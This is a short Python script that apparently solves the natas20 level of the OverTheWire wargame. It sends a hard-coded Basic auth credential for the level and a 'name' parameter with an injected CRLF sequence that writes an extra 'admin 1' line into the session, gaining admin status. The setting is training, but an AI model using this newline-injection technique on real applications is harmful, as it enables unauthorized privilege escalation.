import requests

headers = {
    'Authorization': 'Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpdmI5S0FCRg=='
}

payload = 'admin%0D%0Aadmin 1'
url = f"http://natas20.natas.labs.overthewire.org/index.php?name={payload}"

with requests.Session() as session:
    request = session.post(url=url, headers=headers)
    request = session.post(url=url, headers=headers)

    print(request.content.decode('utf-8'))
